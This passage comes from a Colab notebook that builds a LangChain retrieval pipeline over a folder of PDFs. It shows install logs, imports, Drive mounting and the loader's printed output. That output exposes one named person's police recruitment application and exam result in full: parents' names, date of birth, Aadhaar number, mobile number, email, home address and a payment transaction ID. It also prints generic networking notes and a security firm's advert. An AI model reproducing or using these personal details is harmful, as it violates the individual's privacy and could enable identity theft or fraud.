            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m3.4/3.4 MB\u001b[0m \u001b[31m94.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading watchfiles-0.24.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (425 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m425.7/425.7 kB\u001b[0m \u001b[31m36.0 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading websockets-13.0.1-cp310-cp310-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (157 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m157.3/157.3 kB\u001b[0m \u001b[31m16.1 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading coloredlogs-15.0.1-py2.py3-none-any.whl (46 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m46.0/46.0 kB\u001b[0m \u001b[31m4.7 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading asgiref-3.8.1-py3-none-any.whl (23 kB)\n",
            "Downloading humanfriendly-10.0-py2.py3-none-any.whl (86 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m86.8/86.8 kB\u001b[0m \u001b[31m11.1 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hBuilding wheels for collected packages: llama-cpp-python, pypika\n",
            "  Building wheel for llama-cpp-python (pyproject.toml) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for llama-cpp-python: filename=llama_cpp_python-0.2.90-cp310-cp310-linux_x86_64.whl size=3398646 sha256=101a544e692853ede699a3bb1c041bc7d05d8480cd2b47dcc346337c2902e433\n",
            "  Stored in directory: /root/.cache/pip/wheels/3d/67/02/f950031435db4a5a02e6269f6adb6703bf1631c3616380f3c6\n",
            "  Building wheel for pypika (pyproject.toml) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for pypika: filename=PyPika-0.48.9-py2.py3-none-any.whl size=53723 sha256=44c725c512de2e55c4e51e0466e14f271cdf6349b3a3c467699502ca8d6cac18\n",
            "  Stored in directory: /root/.cache/pip/wheels/e1/26/51/d0bffb3d2fd82256676d7ad3003faea3bd6dddc9577af665f4\n",
            "Successfully built llama-cpp-python pypika\n",
            "Installing collected packages: pypika, monotonic, mmh3, websockets, uvloop, uvicorn, pypdf, overrides, opentelemetry-util-http, opentelemetry-proto, importlib-metadata, humanfriendly, httptools, diskcache, deprecated, chroma-hnswlib, bcrypt, backoff, asgiref, watchfiles, starlette, posthog, opentelemetry-exporter-otlp-proto-common, opentelemetry-api, llama-cpp-python, coloredlogs, opentelemetry-semantic-conventions, opentelemetry-instrumentation, onnxruntime, kubernetes, fastapi, opentelemetry-sdk, opentelemetry-instrumentation-asgi, sentence-transformers, opentelemetry-instrumentation-fastapi, opentelemetry-exporter-otlp-proto-grpc, chromadb\n",
            "  Attempting uninstall: importlib-metadata\n",
            "    Found existing installation: importlib_metadata 8.5.0\n",
            "    Uninstalling importlib_metadata-8.5.0:\n",
            "      Successfully uninstalled importlib_metadata-8.5.0\n",
            "Successfully installed asgiref-3.8.1 backoff-2.2.1 bcrypt-4.2.0 chroma-hnswlib-0.7.6 chromadb-0.5.5 coloredlogs-15.0.1 deprecated-1.2.14 diskcache-5.6.3 fastapi-0.115.0 httptools-0.6.1 humanfriendly-10.0 importlib-metadata-8.4.0 kubernetes-30.1.0 llama-cpp-python-0.2.90 mmh3-4.1.0 monotonic-1.6 onnxruntime-1.19.2 opentelemetry-api-1.27.0 opentelemetry-exporter-otlp-proto-common-1.27.0 opentelemetry-exporter-otlp-proto-grpc-1.27.0 opentelemetry-instrumentation-0.48b0 opentelemetry-instrumentation-asgi-0.48b0 opentelemetry-instrumentation-fastapi-0.48b0 opentelemetry-proto-1.27.0 opentelemetry-sdk-1.27.0 opentelemetry-semantic-conventions-0.48b0 opentelemetry-util-http-0.48b0 overrides-7.7.0 posthog-3.6.6 pypdf-5.0.0 pypika-0.48.9 sentence-transformers-3.1.0 starlette-0.38.5 uvicorn-0.30.6 uvloop-0.20.0 watchfiles-0.24.0 websockets-13.0.1\n"
          ]
        }
      ],
      "source": [
        "!pip install langchain sentence-transformers chromadb llama-cpp-python langchain_community pypdf"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "4FopYAa6Krjj"
      },
      "source": [
        "## Import libraries"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 2,
      "metadata": {
        "id": "kGXeRCdILsha",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "506ee649-6dca-4f61-9bdf-e284b376318c"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.10/dist-packages/pydantic/_internal/_fields.py:132: UserWarning: Field \"model_name\" in HuggingFaceInferenceAPIEmbeddings has conflict with protected namespace \"model_\".\n",
            "\n",
            "You may be able to resolve this warning by setting `model_config['protected_namespaces'] = ()`.\n",
            "  warnings.warn(\n"
          ]
        }
      ],
      "source": [
        "from langchain_community.document_loaders import PyPDFDirectoryLoader\n",
        "from langchain.text_splitter import CharacterTextSplitter,RecursiveCharacterTextSplitter\n",
        "from langchain_community.embeddings import HuggingFaceEmbeddings\n",
        "from langchain.vectorstores import FAISS, Chroma\n",
        "from langchain_community.llms import LlamaCpp\n",
        "from langchain.chains import RetrievalQA, LLMChain"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 3,
      "metadata": {
        "id": "0zEnm5dLTd7s"
      },
      "outputs": [],
      "source": [
        "import pathlib\n",
        "import textwrap\n",
        "from IPython.display import display\n",
        "from IPython.display import Markdown\n",
        "\n",
        "\n",
        "\n",
        "def to_markdown(text):\n",
        "  text = text.replace('•', '  *')\n",
        "  return Markdown(textwrap.indent(text, '> ', predicate=lambda _: True))"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 4,
      "metadata": {
        "id": "XXu9elVHUX1G"
      },
      "outputs": [],
      "source": [
        "# Used to securely store your API key\n",
        "from google.colab import userdata"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "DmzD-oWKLtOJ"
      },
      "source": [
        "## Setup HuggingFace Access Token\n",
        "\n",
        "- Log in to [HuggingFace.co](https://huggingface.co/)\n",
        "- Click on your profile icon at the top-right corner, then choose [“Settings.”](https://huggingface.co/settings/)\n",
        "- In the left sidebar, navigate to [“Access Token”](https://huggingface.co/settings/tokens)\n",
        "- Generate a new access token, assigning it the “write” role.\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 5,
      "metadata": {
        "id": "St7dpcL4UiX0"
      },
      "outputs": [],
      "source": [
        "# Or use `os.getenv('HUGGINGFACEHUB_API_TOKEN')` to fetch an environment variable.\n",
        "import os\n",
        "from getpass import getpass\n",
        "\n",
        "HUGGINGFACEHUB_API_TOKEN = userdata.get(\"HUGGINGFACEHUB_API_TOKEN\")\n",
        "os.environ[\"HUGGINGFACEHUB_API_TOKEN\"] = \"HUGGINGFACEHUB_API_TOKEN\""
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "KFyNhHmsMYBC"
      },
      "source": [
        "## Import document"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 6,
      "metadata": {
        "id": "Z2O4acnZmg66",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "fc116133-7a0b-4a6a-8601-1bf02336960d"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Mounted at /content/drive\n"
          ]
        }
      ],
      "source": [
        "#connect to google drive\n",
        "from google.colab import drive\n",
        "drive.mount('/content/drive') #Fixed typo in directory name"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 7,
      "metadata": {
        "id": "bOrnY8dgMdxt"
      },
      "outputs": [],
      "source": [
        "loader = PyPDFDirectoryLoader(\"/content/drive/MyDrive/Pdf\")\n",
        "docs = loader.load()"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 8,
      "metadata": {
        "id": "K1TTrH5QNQxa",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "9d262ca2-9278-4fcf-bfe5-6be61ec2913a"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216.pdf', 'page': 0}, page_content=\"1.\\nName (As per SSC / Equivalent certificate)\\n:\\nSUNNAM SEETHARAM\\n2.\\nFather's/ Husband's Name\\n:\\nS VEERRAJU\\nPreserve the REGISTRATION NUMBER \\nfor all your future correspondence.\\n3.\\nMother's Name\\n:\\nS SUBHADRA\\n4.\\nGender\\n:\\nMale\\n5.\\nDate of Birth\\n(As per SSC/Equivalent certificate)\\n:\\n16-08-1996\\n4159216\\n6.\\n(a) SSC/Equivalent Roll No.\\n:\\n1111127157\\n(b) Year of Passing\\n:\\n2011\\n11.\\n7.\\nUpload Certificate (SSC or Equivalent)\\n:\\nUploaded\\n8.\\nEducational Qualification\\n:\\nIntermediate  / Any other \\nequivalent\\n9.\\nCommunity\\n:\\nABO-ST\\n10.\\nUpload Community Certificate\\n(For BC, SC and ST)\\n:\\nUploaded\\n13.\\nDo you belong to EWS Category ?\\n:\\nNo\\n14.\\nUpload EWS Certificate\\n(For OC)\\n:\\n---\\n15.\\nDo you belong to Ex-Servicemen ?\\n:\\nNo\\nEx-Servicemen Joining Date\\n:\\n---\\nEx-Servicemen Discharge Date / Likely Date \\nof Discharge\\n:\\n---\\n16.\\nldentificaton Marks\\n(As per SSC / Equivalent certificate)\\n:\\nA MOLE ON THE LEFT SIDE OF \\nTHE CHEST\\n:\\nA MOLE ON THE RIGHT SIDE OF \\nTHE RIBBS\\n17.\\nMobile No.\\n:\\n8688655324\\n12.\\n18.\\nE-mail id\\n:\\nbtgsuryacomputers@gmail.c\\nom\\n19.\\n(a) Do you have Aadhaar Card ?\\n:\\nYes\\n(b) lf yes, please mention number\\n:\\n673915750575\\n20.\\nWhat is your preferred medium\\nof Examination ?\\n:\\nTelugu\\n21.\\nWhich is your prefered place for \\nwriting Preliminary written test ?\\n(SLPRB, AP reserves the Right to \\ninclude New Test Centres, if \\nnecessary)\\n1st\\n:\\nRAJAMAHENDRAVARAM\\n2nd\\n:\\nELURU\\n3rd\\n:\\nTADEPALLIGUDEM\\n22.\\nPost Preferences as per notification\\n1st\\n:\\n21 - SCT PC (Civil) (Men & \\nWomen)\\n2nd\\n:\\n23 - SCT PC (APSP) (Men)\\n23.\\nWhich is your preferred place for \\nappearing in PMT / PET after you \\nhave qualified in Preliminary written \\nExamination ?\\n1st\\n:\\nEast Godavari\\n2nd\\n:\\nWest Godavari\\n24.\\nAre you a Local of State of Andhra \\nPradesh ?\\n:\\nYes\\na) lf yes, which is your Local District ? \\n:\\nWest Godavari\\nb) lf No, which State/UT you belong to ?\\n:\\n---\\n25.\\nAre you claiming benefit of age relaxation ? \\n(Please go through the Notificaiton) \\n:\\nNo\\nIf yes, Please specify the applicable \\ncategory.\\na) BC\\n:  No\\nb) SC\\n:  No\\nc) ST/ABOST\\n:  No\\nd) AP Government Employee\\n:  No\\ne) Ex-Servicemen\\n:  No\\nf) NCC Instructor\\n:  No\\ng) AP State Census Department \\n:  No\\nh) Andhra Pradesh Home Guard\\n:  No\\ni) Widow / Divorced / Judicially             \\n   Separated Women                                                               \\n:  No\\nj) EWS Category\\n:  No\\n26.\\nAs per Rule 3 (G) of GO Ms. No. 97 dated 01.05.2006 and amendments there on, and as mentioned in Notification at Para No. 27, \\nthe candidates falling under certain categories shall be disqualified for recruitment. (Please go through the Notification)\\nDo you come under those \\ncategories ?\\nIf yes, please note that you are not \\neligible for recruitment.\\n:\\nNo\\n27.\\nAddress for Communication\\n:  PEDA JEEDIPUDI VILLAGE DORAMAMIDI POST, BUTTAYA GUDEM \\nMANDAL, West Godavari, BUTTAYA GUDEM, 534448\\n28.\\nFee Paid through : Payment Gateway\\nTransaction Id : YUTI1614269839\\nFee : 150\\nCertified \\nthat \\nI \\nhave \\nread, \\nunderstood \\nand \\naccept \\nall \\nthe \\nTerms \\nand \\nconditions \\nof \\nthe \\nNotification. \\nI \\nundertake \\nComplete \\nresponsibility \\nthat \\nI \\nhave\\nsubmitted \\ncorrect \\ninformation \\nto \\nthe \\nbest \\nof \\nmy \\nknowledge \\nand \\nbelief.\\nNote: \\nPlease \\ndownload \\nHall \\nTicket \\nto \\nhave \\naccess \\nto \\nthe \\nExamination \\nCentre. \\nThe \\nHall \\nTickets \\nwill \\nbe \\navailable \\nfor \\ndownload \\nfrom \\nthe \\nwebsite \\n14\\ndays \\nprior \\nto \\nthe \\nDate \\nof \\nExamination.\\nSTATE LEVEL POLICE RECRUITMENT BOARD, ANDHRA PRADESH\\nSTAGE I ONLINE APPLICATION FORM\\nONLINE APPLICATION FORM FOR THE POSTS OF SCT PC (CIVIL) (MEN & WOMEN): POST CODE NO. 21, \\n     SCT PC (APSP) (MEN): POST CODE NO. 23,\\nVIDE NOTIFICATION RC.NO. 161/SLPRB/RECT.2/2022, DT. 28.11.2022\\n\"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216.pdf', 'page': 1}, page_content='Date : 07-02-2023 14:40:21\\nSTATE LEVEL POLICE RECRUITMENT BOARD, ANDHRA PRADESH\\nSTAGE I ONLINE APPLICATION FORM\\nONLINE APPLICATION FORM FOR THE POSTS OF SCT PC (CIVIL) (MEN & WOMEN): POST CODE NO. 21, \\n     SCT PC (APSP) (MEN): POST CODE NO. 23,\\nVIDE NOTIFICATION RC.NO. 161/SLPRB/RECT.2/2022, DT. 28.11.2022\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/https___slprb.ap.gov.in_UI_PCResults (2).pdf', 'page': 0}, page_content='RESUL T \\nSCT PC (Civil) (Men& W omen) and SCT PC (APSP) (Men) in Police Department, \\nvide Notiﬁcation Rc. No. 161/SLPRB/ Rect.2/2022, Dtd: 28.11.2022\\nPreliminary Written T est (PWT) Date: 22.01.2023\\n\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0 Enter\\nRegistr ation Number:4 1 5 9 2 1 6   \\nEnter PWT Hall Tick et Number : 5 5 6 1 2 9 0 3 8 4  \\nGener ate New Image\\nType the code from\\nthe image\\n \\nSubmit\\n\\xa0\\xa0 \\xa0\\xa0\\nRegistr ation Number 4159216\\nName of the Candidate SUNNAM SEETHARAM\\nGender Male\\nMarks in PWT 66\\nResult for PWT Qualiﬁed\\nDownload another Result  Print\\nDownload cop y of OMR shee'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/IMG_20231011_110129.pdf', 'page': 0}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 0}, page_content='Theory\\nHacking with \\nNetwork Basics'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 1}, page_content=\" \\n A network is a group of two or more  computer systems or other devices \\nthat are linked together to exchange data . In networks, computing devices \\nexchange data with each other using data links between nodes. These data links \\nare established with the help of cable media such as wires or wireless media \\nsuch as WiFi.  \\n \\nNetwork Components and Functions  \\nServer : A computer or device on a network that manages  network \\nresources. Servers are often dedicated , meaning that they perform no other tasks \\nbesides their server tasks like accepts and responds to requests made by another \\nprogram, known as a client.  \\nClient : A client is an application that runs on a personal computer or \\nworkstation and relies on a serve r to perform some operations. The client \\naccesses the server by way of a network.  \\nDevices : Computer devices, such as a CD -ROM drive or printer, that is \\nnot part of the essential computer. Examples of devices include disk drives, \\nprinters, and modems.  \\nHub : Hub is a network hardware device for connecting multiple devices \\nand making them act as a single network segment. A hub works at the physical \\nlayer of the OSI model.  \\nSwitch : A device that filters and forwards packets between LAN \\nsegments. Switches  operate at the data link layer and  sometimes the network \\nlayer of the OSI Reference Model.  \\nRouter : A router is a device that  is capable of forwarding data packets on \\na network . Routers are placed  at the junction  (gateway)  of two or more \\nnetworks connect . Routers use headers and forwarding tables to determine the \\nbest path for forwarding the packets.  \\n  Bridge : Bridge is a computer networking device that connects a local \\narea network (LAN) to another local area network tha t uses the same protocol.  \\nAccess Point : A hardware device or a computer's software that acts as a \\ncommunication hub for users to connect all their wireless device.  \\n \\nTypes of Networks  \\n \\nLocal area network (LAN)  \\nA LAN is a network that connects computers  and devices in a limited \\ngeographical area such as a home, school, office building.  \\nWide area network (WAN)  \\nA WAN  is a computer network that covers a large geographic area such \\nas a city, country, or spans even inter continental distances. A WAN uses a \\ncommunications channel that combines many types of media such as telephone \\nlines,  ethernet cables, optical fibers , etc. \"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 2}, page_content=' \\n Metropolitan Area Networks (MAN)   \\nMetropolitan area Network covers a larger area than that of a LAN a nd \\nsmaller area  when compared to WAN. MANs rarely extend beyond 100 KM \\nand comprise a combination of different hardware and transmission media.  \\nWireless Local Area Network (WLAN)  \\nWireless local area networks provide wireless network communication \\nover shor t distances using radio or infrared signals instead of traditional \\nnetwork cabling. WLAN s are built by attaching a device called the access point  \\nto the edge of the wired network. Clients communicate with the AP using a \\nwireless network adapter similar in f unction to a traditional Ethernet adapter.  \\nVirtual private network (VPN)  \\nThe v irtual  private network is an overlay network in which some of the \\nlinks between nodes are carried by virtual circuits  in the network  instead of \\nphysical wires. The data link layer proto cols of the virtual network are said to \\nbe tunneled through  the network .   \\nPersonal Area Network (PAN)  \\nA personal area network is a computer network organized around an \\nindividual . Personal  area networks typically involve  mobile devices. Personal \\narea networks can be wired or wirelessly.  These networks gen erally cover a \\nnetwork range of 10 meters (about 30 feet).  \\n \\nOSI model  \\nOSI (Open Systems Interconnection) is a reference model for how \\napplications communicate over a networ k. The main concept of OSI is that the \\nprocess of communication between two endpoints in a network can be divided  \\ninto seven distinct groups of related functions  or layers. Each communicating \\nuser or program is on a device that can provide those seven lay ers of function.  \\nThe seven Open Systems Interconnection layers are:  \\n \\n \\n \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 3}, page_content=' \\n Layer 1: Physical Layer  \\nThis layer conveys the bit stream across the network either electrically, \\nmechanically or through radio waves. The physical layer covers a variety of \\ndevices an d mediums, among them cabling, connectors, receivers, transceivers , \\nand repeaters.  \\nLayer 2: Data Link Layer  \\nThis layer sets up links across the physical network, putting packets into \\nnetwork frames. This layer has two sublayers the logical link control lay er and \\nthe media access control layer (MAC). MAC layer types include Ethernet and \\n802.11 wireless specifications.  \\nLayer 3: Network Layer  \\nThis layer handles addressing and routing the data. To transfer it from the \\nright source to the right destination. The IP address is part of the network  layer.  \\nLayer 4: Transport Layer  \\nThis layer manages packetization of data, then the delivery of the packets, \\nincluding checking for errors in the data once it arrives. On the internet, TCP \\nand UDP provide these services for most a pplications.  \\nLayer 5: Session Layer  \\nThe session layer controls the connections between computers. It \\nestablishes, manages and terminates the connections between the local and \\nremote application.  \\nLayer 6: Presentation Layer  \\nThis layer is usually part of an  operating system (OS) and converts \\nincoming and outgoing data from one presentation format to another for \\nexample, from clear text to encrypted text at one end and back to clear text at \\nthe other.  \\nLayer 7: Application Layer  \\nThe application layer of the OSI model interacts with the end user. \\nProtocols at this layer handle  the requests from different software applications. \\nIf a web browser wants to download an image, an email client wants to check \\nthe server , and a file -sharing program wants  to upload a movie, t he protocols in \\nthe application layer will process those requests.  \\n \\nIP address  \\nAn Internet Protocol address (IP address) is a numerical label assigned to \\neach device connected to a computer network. IP addres s serves two purposes , \\nhost or networ k interface identification and location addressing. Internet \\nProtocol version 4 (IPv4) defines an IP address as a 32 -bit number  and new \\nversion of IP (IPv6), uses 128 bits for the IP address.  \\nPrivate IP address : A private IP address is a non -Internet facin g IP address. \\nPrivate IP addresses are provided by network devices, such as routers, using \\nnetwork address translation (NAT).  '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 4}, page_content=' \\n Public IP address:  A public IP address is an IP address that can be accessed  \\nover the Internet. The p ublic  IP address is a globally  unique IP address assigned \\nto a computing device.  \\n \\nIPv4: Internet Protocol Version 4 is the fourth revision of the Internet Protocol \\nused to identify devices on a network. IPv4 is the most widely deployed Internet \\nprotocol used to connect devices to the Inter net. IPv4 uses a 32 -bit address \\nscheme allowing  a total of 2^32 addresses.  \\n \\nIPv6: Internet Protocol Version 6 is the newest version of the Internet Protocol  \\nreviewed in the IETF standards committees to replace the current version of \\nIPv4. IPv6 addresses are 128 -bit IP address written in hexadecimal and \\nseparated by colons. An example IPv6 address could be written like this 3 ffe: \\n1900:4545:3 :200: f 8ff: fe 21:67cf.  \\n \\nIP address classes  \\nThere are five classes of  IP addresse s, they are  Class A, Class B, Class C, Class \\nD and Class E,  where only A, B, and C are commonly used.  \\n \\nClass  Address Range  Supports  \\nClass A  1.0.0.1 to \\n126.255.255.254  Supports 16 million hosts on each \\nof 127 networks.  \\nClass B  128.1.0.1 to \\n191.255.255.254  Supports 65,000 hosts on each of \\n16,000 networks.  \\nClass C  192.0.1.1 to \\n223.255.254.254  Supports 254 hosts on each of 2 \\nmillion networks.  \\nClass D  224.0.0.0 to \\n239.255.255.255  Reserved for multicast groups.  \\nClass E  240.0.0.0 to \\n254.255.255.254  Reserved for future use, or Research \\nand Development Purposes.  \\n \\nSubnetwork (Subnet)    \\nA subnet is a logical subdivision of an IP network.  Dividing a network \\ninto two or more networks is known as subnetting. Computers that belong to a \\nsubnet are addressed with a significant bit -group in their IP addresses. \\nSubnetting  results in the logical division of  an IP address into two parts, the \\nnetwork address , and the host identifier.  '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 5}, page_content=' \\n  \\nSuper network  (Supernet)  \\nSupernet is an Internet Protocol network that is formed, for combining \\ntwo or more networks into a larger  network. The benefits of supernetting are \\nconservation of address space, gaining efficiency regarding  memory storage and \\nroute information processing.  \\n \\nNetwork address translation  \\nNetwork address translation (NAT) is a method of remapping one IP \\naddress space into another by modifying network address information in IP \\nheader packets while they are in transit. It has become a popular and essential \\ntool in conserving global address space in the face of IPv4 address exhaustion.  \\n \\nDynamic Host Conf iguration Protocol  \\nThe Dynamic Host Configuration Protocol (DHCP) is a network \\nmanagement protocol used on UDP/IP networks. A DHCP server dynamically \\nassigns an IP address and other network configuration parameters to each \\ndevice on a network  so that  they can communicate with other IP networks.  \\n \\nTCP  \\nTCP stands for Transmission Control Protocol, which is a widely used \\nprotocol for data transmission over a network. TCP establishes a connection \\nbetween two hosts before transmitting data, to ensure that data transm itted over \\nthe network  reaches the destination  without fail. TCP also known as a \\nconnection -oriented  protocol, establishes  a reliable connection between sender \\nand receiver. TCP provides error and flow control mechanisms which help in \\norderly transmission of data a nd retransmission of lost packets.  \\n \\nUDP  \\nUDP stands for User Datagram Protocol, which is connectionless \\nprotocol, mostly used for connections that can tolerate data loss. UDP is used by \\napplications on the internet that offer voice and video communications,  which \\ncan suffer some data loss without adversely affecting the quality. UDP does not \\nprovide error and flow control mechanisms because of which it does not require \\na connection to be established before transmitting data over the network . \\n \\nICMP  \\nICMP stands fo r Internet Control Message Protocol ; this is widely used \\nfor internet communication troubleshooting or generated in response to errors in \\nIP operations, this will send packets to the target machine and will see whether \\nthe packets  are delivered  or not.  \\n '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 6}, page_content=' \\n Address Resolution Protocol  \\nAddress Resolution Protocol (ARP) is a communication protocol used for \\ndiscovering the link layer address, such as a MAC address, associated with a \\ngiven network layer address. This mapping is a critical function in the Internet \\nProtocol suite. It works within the boundaries of a single network never routed \\nacross internetworking nodes. ARP uses a simple message format containing \\none address resolution request or response. The size of the ARP message \\ndepends on the link layer and network layer address sizes.  \\n \\nDomain Name System  \\nDomain Name System (DNS) is a naming system for resources connected \\nto the Internet or a private network. The DNS is responsible for assigning \\ndomain names and mapping those names to Internet resources by designating \\nname servers for each domain. Network a dministrators have authority over the \\nsubdomains of their allocated name space  to other name servers. Domain Name \\nSystem is an essential component of Internet functionality.  \\n \\nInternet Group Management Protocol  \\nInternet Group Management Protocol (IGMP) is a  communication \\nprotocol used by hosts and adjacent routers on IPv4 networks to establish \\nmulticast group memberships. IGMP is an integral part of IP multicast. IGMP \\ncan be used for one -to-many networking applications such as online video \\nstreaming and gami ng and allows the more  efficient use of resources.  \\n \\nRouting  \\nRouting is the process of selecting a path for traffic in a network or across \\nmultiple networks. In routing , network packets from their source toward their \\ndestination are routed through int ermediate network nodes by specific packet \\nforwarding mechanisms. Intermediate nodes are typically network ed hardware \\ndevices such as routers, bridges, gateways, firewalls, or switches. In routing , \\nprocess packets are directed  on based on routing tables, which maintain a record \\nof the routes to various network destinations. An administrator specifies the \\nrouting  table . \\n \\nRouting protocol  \\nRouting protocol specifies how routers communicate with each other, \\ndistributing information,  which  enables them to sel ect routes between any two \\nnodes on a computer network. Routing algorithms determine  to choose a \\nspecific route . A routing protocol shares this information first among immediate \\nneighbors, and then throughout the network.  The major types of routing \\nprotoco ls. \\n● Routing Information Protocols ( RIP) '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/0.Network-Basics-Theory-1.pdf', 'page': 7}, page_content=' \\n ● Interior Gateway Routing Protocol (IGRP)  \\n● Open Shortest Path First (OSPF)  \\n● Exterior Gateway Protocol (EGP)  \\n● Enhanced Interior Gateway Routing Protocol (EIGRP)  \\n● Border Gateway Protocol (BGP)  \\n● Intermediate System -to-Interme diate System (IS -IS) \\n \\n \\nReferences:   \\n  \\n1. Beal, V. (n.d.). Network Fundamentals Study Guide. Retrieved from \\nhttps://www.webopedia.com/quick_ref/network -fundamentals -study -\\nguide.html . \\n2. Beal, V. (n.d.). What is The Difference Between IPv6 and IPv4 ? \\nRetrieved from \\nhttps://www.webopedia.com/DidYouKnow/Internet/ipv6_ipv4_differenc\\ne.html . \\n3. What is OSI model (Open Systems Interconnection)? - Definition  from \\nWhatIs.com. (n.d.). Retrieved from \\nhttps://searchnetworking.techtarget.com/definition/OSI  \\n4. Image reference: 7 Layers of OSI Model and Their Functions. (2017, \\nNovember 05). Retrieved from http://e lectricala2z.com/cloud -\\ncomputing/osi -model -layers -7-layers -osi-model/   '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 0}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 1}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 2}, page_content=' \\n “We specialize in Information \\nSecurity Solutions including \\nPenetration Testing, Forensic \\nAnalysis and Computer \\nInvestigations to a diverse \\nrange of clients worldwide”  \\n  \\n \\n \\n \\n \\n \\n \\n \\n \\n \\nCyber Investigations N.I. Ltd.  \\nNorthern Ireland Science Park \\nQueens Road \\nQueens Island \\nBelfast BT3 9DT \\nUnited Kingdom \\n  \\nEmail : \\n info@cyberinvestigationsni.com \\n \\nTelephone: \\n+44(0)28 9079 6983 \\n \\nPlease visit us on:  www.cyberinvestigationsni.com  \\n  \\nFor a free security \\nconsultation, then please \\ncontact us by either mail \\nor phone and one of our \\nsecurity experts will be \\nhappy to assist you. '),\n",
